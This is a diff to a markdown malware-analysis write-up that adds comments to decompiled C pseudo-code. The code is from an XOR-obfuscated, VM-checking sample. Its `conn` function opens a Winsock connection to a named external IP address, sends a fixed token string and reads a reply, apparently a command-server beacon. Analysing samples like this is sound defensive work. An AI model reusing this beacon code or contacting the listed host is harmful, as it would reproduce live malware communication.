@@ -17,18 +17,24 @@ At the beginning of the file there is `checkVM` function and some other checks, 
 Enter `conn`  function, because the file used `xor obfuscate`, I debug to know function to be called, explain to `conn`:
 
 ```c
-// 
+// define winsock
 v6 = ((int (__cdecl *)(int, int *, int, int))ws2_32_WSAStartup(514, &v40, a3, a4);
+
 // get info of this addr 35.241.159.62 --> 62.159.241.35.bc.googleusercontent.com
 ((int (__stdcall *)(__m128i *, int, _DWORD *, void (**)(void)))ws2_32_getaddrinfo)(&v38, dword_40A3F8, v41, &v39);
+
 // socket
     s = (const CHAR *)((int (__stdcall *)(_DWORD, _DWORD, _DWORD, __m128i *))ws2_32_socket)(*((_DWORD *)v39 + 1),*((_DWORD *)v39 + 2),*((_DWORD *)v39 + 3),v48);
+    
 // conn addr above
 ((int (__stdcall *)(const CHAR *, _DWORD, _DWORD))ws2_32_connect)(s,*((_DWORD *)v35 + 6),*((_DWORD *)v35 + 4));
+
 // send: "KADMKLAFD:LSM$OPM@FLK:FM!N$@N$"
 ((int (__stdcall *)(const CHAR *, __m128i *, int, _DWORD))ws2_32_send)(s,&v28,&v28.m128i_i8[strlen(v28.m128i_i8) + 1] - &v28.m128i_i8[1],0)
+
  // recv
 ((int (__stdcall *)(const CHAR *, _BYTE *, int, _DWORD))ws2_32_recv)(s, buf, 1024, 0);
+
 // shutdown
 (int (__stdcall *)(const CHAR *, int))ws2_32_shutdown)(s, 1);
 ```
